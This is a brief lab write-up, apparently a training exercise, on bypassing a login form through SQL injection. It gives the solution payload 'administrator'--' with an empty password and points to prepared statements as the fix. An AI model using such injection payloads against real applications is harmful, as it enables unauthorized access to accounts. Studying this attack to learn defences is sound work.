# Lab 2: SQL Injection Vulnerability — Login Bypass

## Lab Overview

This lab explores how a SQL injection vulnerability in a login form allows an attacker to bypass authentication and gain unauthorized access to the application.

## Key Concepts Learned

- How SQL injection can be exploited to bypass login authentication.  
- The importance of input validation and prepared statements to secure login forms.

## Solution:

The sql injection payload to bypass the login was:

<img width="703" height="120" alt="Screenshot (768)" src="https://github.com/user-attachments/assets/ee1c15e7-fa3c-4d61-aea8-8f06474bb3b8" />

```sql
administrator'--
password : empty
```
